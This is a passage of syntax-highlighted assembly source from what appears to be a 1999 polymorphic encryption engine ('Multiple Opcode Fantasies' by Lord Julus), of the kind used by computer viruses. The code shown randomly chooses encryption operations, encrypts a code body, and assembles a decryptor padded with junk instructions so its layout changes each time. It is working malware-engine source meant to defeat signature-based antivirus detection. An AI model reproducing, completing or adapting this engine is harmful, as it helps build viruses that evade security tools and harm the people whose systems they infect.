      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the static key method</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the 'next code' method</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the operation over the key</span><span class="sc0">
                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; restore length and pointer</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; put key in eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">codelength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; First we encrypt the code                          0   1   2</span><span class="sc0">
</span><span class="sc1">; op1 = operation over code with the key register  (XOR/ADD/SUB)</span><span class="sc0">
</span><span class="sc1">; op2 = operation over code with the static key    (ROR/ROL)</span><span class="sc0">
</span><span class="sc1">; op3 = operation over code with next code         (XOR/ADD/SUB)</span><span class="sc0">
</span><span class="sc1">; op4 = operation over the key with the keyvalue   (XOR/ADD/SUB)</span><span class="sc0">

</span><span class="sc5">mainloop</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; edx = dword to encrypt</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op3</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ecx = op3</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; &lt;op3&gt; eax, dword ptr [ebx+4]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makeop</span><span class="sc0">                          </span><span class="sc1">; do it!</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op2</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ecx = op2</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notror</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                          </span><span class="sc1">; ROR</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over1</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notror</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                          </span><span class="sc1">; ROL</span><span class="sc0">
</span><span class="sc5">over1</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op1</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ecx = op1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; we do &lt;op1&gt; edx, eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makeop</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_thankyou</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ecx = op4</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyvalue</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; we do &lt;op4&gt; eax, keyvalue</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makeop</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_thankyou</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; we go back 1 dword</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">mainloop</span><span class="sc0">                        </span><span class="sc1">; and loop</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok</span><span class="sc0">                               </span><span class="sc1">; jump over</span><span class="sc0">

      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Multiple Opcode Fantasies 32Bit V.2.5 by Lord Julus - 1999"</span><span class="sc0">

</span><span class="sc5">makeop</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; is it the first method ?</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notxor</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; yes, XOR!</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ready</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notxor</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; or maybe second ?</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notadd</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; yes, ADD!</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ready</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notadd</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; then, SUB!</span><span class="sc0">
</span><span class="sc5">ready</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">; restore code length</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">; restore decryptor place</span><span class="sc0">
      </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; we work on dwords</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; get decryption start key</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; align start of code</span><span class="sc0">

</span><span class="sc1">; eax = initial key</span><span class="sc0">
</span><span class="sc1">; ebx = initial offset</span><span class="sc0">
</span><span class="sc1">; ecx = real length in dwords</span><span class="sc0">
</span><span class="sc1">; Here we start taking, filling and writing the decryptor</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">decryptor</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; esi points to the decryptor</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; counter for instructions</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; first we make some junk so that</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">; the jump to the decryptor is</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">; always at another offset</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_intend</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">; ...and some more...</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getinstr</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">over_all</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                </span><span class="sc1">; load one byte</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">                         </span><span class="sc1">; check for instruction end</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">over_instr</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">                         </span><span class="sc1">; check for final end</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">over_all</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                </span><span class="sc1">; store the byte</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">getinstr</span><span class="sc0">                         </span><span class="sc1">; do it again...</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">over_instr</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makeinstr</span><span class="sc0">                       </span><span class="sc1">; fill the instruction</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_junk_please</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">; create junk after it</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_junk_please</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; increment counter</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">getinstr</span><span class="sc0">                         </span><span class="sc1">; and do it again...</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">over_all</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; the end...</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">; ...final junk</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">the_end</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; mark the end</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">; some more...</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_end</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; real end !</span><span class="sc0">
      </span><span class="sc6">popad</span><span class="sc0">                                </span><span class="sc1">; restore registers</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                  </span><span class="sc1">; and return</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Here we have the instruction maker and the junk code generator.           Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">makeinstr</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                        </span><span class="sc1">; The routine to fill the instr.</span><span class="sc0">
      </span><span class="sc6">pushad</span><span class="sc0">                               </span><span class="sc1">; save all regs</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">               </span><span class="sc1">; check for counter &lt; 13</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; don't tell me that this is not</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">; optimized because I know, but</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; it is very difficult to deal</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc01</span><span class="sc0">                            </span><span class="sc1">; with relative shit relative</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; to different imagebases...</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc02</span><span class="sc0">                            </span><span class="sc1">; so get of my back ;-)</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc03</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc04</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc05</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc06</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc07</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc08</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc09</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc10</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc11</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proc12</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;Here are the procedures to fill each instruction of the real decryptor</span><span class="sc0">

</span><span class="sc5">proc01</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; mov preg, code_start</span><span class="sc0">
